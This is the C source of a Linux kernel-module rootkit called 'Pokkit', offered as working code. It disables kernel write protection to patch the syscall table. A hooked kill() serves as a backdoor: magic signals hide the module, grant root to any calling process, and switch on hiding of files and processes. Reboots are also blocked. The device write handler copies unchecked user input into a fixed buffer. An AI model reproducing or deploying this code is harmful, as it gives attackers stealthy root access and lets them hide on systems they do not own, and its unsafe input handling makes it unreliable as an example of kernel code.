#include <linux/init.h> // macros to mark up functions
#include <linux/module.h> // core header for loading lkms into the kernel
#include <linux/kernel.h> // types, macros, functions for kernel
#include <linux/kallsyms.h> // functions for kallsyms actions
#include <linux/unistd.h> // syscalls macros (checks for 32 bit and defines accordinly)
#include <linux/version.h> // get kernel versions
#include <linux/kprobes.h> // to probe kernel dymbols
#include <asm/paravirt.h>
#include <linux/dirent.h> // dirent
#include <linux/slab.h>
#include <linux/cred.h> // credentials
#include <linux/syscalls.h>
#include <linux/uaccess.h> // copy to/from user space
#include <linux/fs.h>
#include <linux/miscdevice.h> // dev
#include <linux/reboot.h> // reboot function
#include <linux/sched.h>


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Pokkit");
MODULE_AUTHOR("NondairyDig");
MODULE_VERSION("0.3");


#define DEVICE_SIZE 512 // size of possible input in bytes
char last_data[DEVICE_SIZE] = "no data has been written yet"; // last written data from userspace
char hide_pid[NAME_MAX]; // pid to hide
char PREFIX[DEVICE_SIZE] = "asdfasdfasdfasdfasdf"; // filename prefix to hide


#ifdef CONFIG_X86_64 /* check if system is 64bit*/
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) /*check if kernel version uses ptregs_t type for system calls*/
#define PTREGS_SYSCALL_STUB 1 /*signal 64bit*/
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); /*define type for syscalls functions*/
const int ACTIVE_HOOKS_SIZE = 4; /*Available number of hooks to store*/
typedef struct HOOK {
    int call;
    void * f_ptr;
    ptregs_t original;
} HOOK; /*defiine structure to keep hooks by syscall, pointer to new function, pointer to original function*/
#else
typedef asmlinkage long (*syscall_old_t)(pid_t pid, int sig); ////change!!!
syscall_old_t orig_kill;
typedef struct HOOK {
    int call;
    void * f_ptr;
    void * original;
} HOOK;
#endif
#endif


static int hidden = 0; // flag if module is hidden
static struct list_head *prev_module;
unsigned long *__SYS_CALL_TABLE; // variable for a pointer to the syscall table
static HOOK *ACTIVE_HOOKS; // HOOKs array


static inline void flip_cr0_force(unsigned long val){ //method to change cr0 register to un/protect the kernel memory
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}


static void unprotect_memory(void){
    flip_cr0_force(read_cr0() & (~ 0x10000)); // &'ing to set the 6th bit in the register and reversing it to 0 to unprotect the memory
    printk(KERN_INFO "unprotected memory\n");
}


static void protect_memory(void){
    flip_cr0_force(read_cr0() | (0x10000)); // |'ing to set the 6th bit in the register to 1 unprotect the memory
    printk(KERN_INFO "protected memory\n");
}


static int hook(int sysc, void *f_ptr){
    unprotect_memory();
    __SYS_CALL_TABLE[sysc] = (unsigned long)f_ptr; // find(by index with unistd.h) the syscall in the table and set the function pointer to the mallicious function
    printk(KERN_INFO "hooked %d and tied to %lu\n", sysc, (unsigned long)f_ptr);
    protect_memory();
    return 0;
}


static int unhook(int sysc){
    size_t i = 0;
    while (i < ACTIVE_HOOKS_SIZE) // loop the hooks array
    {
        if(ACTIVE_HOOKS[i].call == sysc){ // check if the syscall was found
            unprotect_memory();
            // return the syscall function pointer in the syscall table to the original before the hook
            __SYS_CALL_TABLE[ACTIVE_HOOKS[i].call] = (unsigned long)ACTIVE_HOOKS[i].original;
            protect_memory();
            break;
        }
        i++;
    }
    return 0;
}


static void set_root(void){
    struct cred *p_creds;
    p_creds = prepare_creds(); // get a COPY of the current task's credentials
    if(p_creds == NULL){
        return;
    }
    // alter the copy to root ids
    p_creds->uid.val = p_creds->gid.val = 0;
    p_creds->euid.val = p_creds->egid.val = 0;
    p_creds->suid.val = p_creds->sgid.val = 0;
    p_creds->fsuid.val = p_creds->fsgid.val = 0;

    commit_creds(p_creds); // commit the credentials to the task
}


static void show_mod(void) {
    //add to the modules linked list the current module after the one it already had been attached
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}


static void hide_mod(void) {
    // keep the module that this module is attached to after in the modules linked list, to reattach later
    prev_module = THIS_MODULE->list.prev;
    // delete this module from the list by linking previous module to the next(thats behind the scenes)
    list_del(&THIS_MODULE->list);
    hidden = 1;
}


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_getdents64(const struct pt_regs *regs){
    // get the dirent pointer in user space from the register
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    long error;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret = ACTIVE_HOOKS[1].original(regs); // get the original function's return value (size of dirent record)
    dirent_ker = kzalloc(ret, GFP_KERNEL); // allocate memory to keep the dirents inside to work with within the program

    // check if empty directory or not enough space to allocate
    if((ret <= 0) || ( dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret); // get the dirent itself from the user space in dirent address
    if(error){
        goto done;
    }

    while (offset < ret) // until reached full dirent record length
    {
        current_dir = (void *)dirent_ker + offset;
        // check if name of directory is prefixed with th prefix we want to hide or the pid we want to hide and that the pid is not empty
        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0 && strncmp(hide_pid, "", NAME_MAX) != 0)){
            // if the current dir is matched and first in line, keep offset and shorten the record of dirents to start from the next one
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen; // set record length minus the matched dirent
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret); //move record start to the second dirent
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen; // skip this dirent by increasing prevoius one's length record to make system skip to next one
        }
        else
        {
            previous_dir = current_dir; // if not matched, progress
        }
        
        offset += current_dir->d_reclen; // incriment offset to next dirent

    }
    
    error = copy_to_user(dirent, dirent_ker, ret); // copy the new dirents record to user dirent pointer in user space
    if(error){
        goto done;
    }

    done:
        kfree(dirent_ker); // free the allocated space for dirent record
        return ret; // return size of returned record
}

static asmlinkage int hack_getdents(const struct pt_regs *regs){
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    
    int ret = ACTIVE_HOOKS[2].original(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0 && strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

    done:
        kfree(dirent_ker);
        return ret;

}
#else
#endif

static int store_syscall(int sysc, int i){
    /*#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) use pt_regs stub for syscalls*/
        #ifdef PTREGS_SYSCALL_STUB
        ACTIVE_HOOKS[i].call = sysc; // store the syscall number(like id)
        ACTIVE_HOOKS[i].original = (ptregs_t)__SYS_CALL_TABLE[sysc]; // store the original syscall function pointer
        printk(KERN_INFO "Stored SYSCALL %d\n", sysc);
        #else
        /*#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)*/
        ACTIVE_HOOKS[i].call = sysc;
        ACTIVE_HOOKS[i].original = (syscall_old_t)__SYS_CALL_TABLE[sysc];
        printk(KERN_INFO "Stored SYSCALL old %d\n", sysc);
        #endif
    return 0;
}


static unsigned long *get_syscall_table(void){
    static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name" // ready the kbrobe to probe the kallsyms_lookup_name function
    };

    typedef unsigned long (*t_kallsyms_lookup_name)(const char *); // the kallsyms_lookup_name function prototype
    unsigned long *syscall_old_table; // define syscall table pointer to return later
    #if LINUX_VERSION_CODE > KERNEL_VERSION(5, 8, 0)
        register_kprobe(&kp);
        t_kallsyms_lookup_name kallsyms_lookup_name_new;
        kallsyms_lookup_name_new = (t_kallsyms_lookup_name)kp.addr; // get address of function
        syscall_old_table = (unsigned long*)kallsyms_lookup_name_new("sys_call_table"); // get starting point of syscall table in memory
        unregister_kprobe(&kp);
    #elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0) && LINUX_VERSION_CODE < KERNEL_VERSION(5, 8, 0)
        syscall_old_table = (unsigned long*)kallsyms_lookup_name("sys_call_table"); // find syscall table symlink and get table address
    #else
        syscall_old_table = NULL;
    #endif
    return syscall_old_table;
}


static int cleanup(void){
    int i = 0;
    unprotect_memory();
    while(i < ACTIVE_HOOKS_SIZE){
        if(ACTIVE_HOOKS[i].call != 0){ // if hook is actual and not empty
            __SYS_CALL_TABLE[ACTIVE_HOOKS[i].call] = (unsigned long)ACTIVE_HOOKS[i].original; // revert syscall table functiion address for the syscall to the original
        }
        i++;
    }
    protect_memory();
    kfree(ACTIVE_HOOKS);// free hooks array
    return 0;
}


ssize_t reader(struct file *filep,char *buff,size_t count,loff_t *offp)
{
    if (copy_to_user(buff, last_data, strlen(last_data)) != 0) { // copy last written data to user using the device
        printk("Kernel -> userspace copy failed!\n");
        return -1; // return error
    }
    return strlen(last_data); // return length of data that was copied
}


ssize_t writer(struct file *filep,const char *buff,size_t count,loff_t *offp) // function to get config of what to hide and what type
{
    char tmpdata[DEVICE_SIZE + 1];
    if (copy_from_user(tmpdata, buff, count) != 0) {
        printk("Userspace -> kernel copy failed!\n");
        return -1;
    }
    if(memcmp("hide ", tmpdata, strlen("hide ")) == 0){
        if(strlen(tmpdata) > strlen("hide ") + 3){
            strcpy(last_data, tmpdata + strlen("hide "));
            strcpy(PREFIX, last_data);
        }
    }
    if(memcmp("hidep ", tmpdata, strlen("hidep ")) == 0){
        if(strlen(tmpdata) > strlen("hidep ")){
            strcpy(last_data, tmpdata + strlen("hidep "));
            strcpy(hide_pid, last_data);
        }
    }
    printk(KERN_INFO "%s", last_data);
    return 0;
}


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_reboot(const struct pt_regs *regs){
    int magic1 = regs->di;
    int magic2 = regs->si;
    unsigned int cmd = regs->dx;
    void *arg = regs->r10;
    
    return -1; //return error when trying to reboot
}
#else
static asmlinkage int hack_reboot(int magic1, int magic2, unsigned int cmd, void* arg){
    return -1;
}
#endif


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
    int sig = regs->si;
    int pid = regs->di;
    if ( (sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide pookkit\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show pookkit\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        printk(KERN_INFO "Setting root for calling process\n");
        set_root();
        return 0;
    }
    else if ((sig == 63) && (pid == 1)){
        if(store_syscall(__NR_getdents64, 1) == 1){
            printk(KERN_ERR "error storing syscall %d\n", __NR_getdents64);
        }
        if(hook(__NR_getdents64, &hack_getdents64) == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
        }
        if(store_syscall(__NR_getdents, 2) == 1){
            printk(KERN_ERR "error storing syscall %d\n", __NR_getdents);
        }
        if(hook(__NR_getdents, &hack_getdents) == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
        }
    }
    else if ((sig == 63) && (pid == 2)){
        if(store_syscall(__NR_reboot, 3) == 1){
            printk(KERN_ERR "error storing syscall %d\n", __NR_reboot);
        }
        if(hook(__NR_reboot, &hack_reboot) == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
    }
    return ACTIVE_HOOKS[0].original(regs);
}
#else
static asmlinkage long hack_kill(pid_t pid, int sig){
    if ( (sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide pookkit\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show pookkit\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        printk(KERN_INFO "Setting root for calling process\n");
        set_root();
        return 0;
    }
    else if ((sig == 64) && (pid == 69)){
        if(store_syscall(__NR_getdents64, 1) == 1){
            printk(KERN_ERR "error storing syscall %d\n", __NR_getdents64);
        }
        if(hook(__NR_getdents64, &hack_getdents64) == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
        }
        if(store_syscall(__NR_getdents, 2) == 1){
            printk(KERN_ERR "error storing syscall %d\n", __NR_getdents);
        }
        if(hook(__NR_getdents, &hack_getdents) == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
        }
    }
    return ACTIVE_HOOKS[0].original(pid, sig);
}
#endif


struct file_operations fops = { // file operations on device file, what functions to call when reading/writing
    read: reader,
    write: writer
};

static struct miscdevice controller = { // device configuration in file system and kernel
    .minor = MISC_DYNAMIC_MINOR,
    .name = "controller",
    .fops = &fops
};


static int __init mod_init(void){
    printk(KERN_INFO "Activated pookkit, Initializing & Hooking Kill\n");
    misc_register(&controller); // register the device for interaction within filesystem
    __SYS_CALL_TABLE = get_syscall_table(); // get the syscall table
    ACTIVE_HOOKS = kzalloc(sizeof(HOOK)*ACTIVE_HOOKS_SIZE, GFP_KERNEL); // allocate memory to the number hooks as the number of capabilities
    if (!__SYS_CALL_TABLE){
        printk(KERN_ERR "Error: SYSCALL Table can't be found\n");
        return 1;
    }
    if(store_syscall(__NR_kill, 0) == 1){
        printk(KERN_ERR "error storing syscall %d\n", __NR_kill);
    }
    if(hook(__NR_kill, &hack_kill) == 1){ //hook the kill function for interaction with the lkm
        printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
    }
    return 0;
}


static void __exit mod_exit(void){
    cleanup(); //cleanup the hooks and revert them
    misc_deregister(&controller); // deregister the device controller
    printk(KERN_INFO "pookkit: exit\n");
}


module_init(mod_init);
module_exit(mod_exit);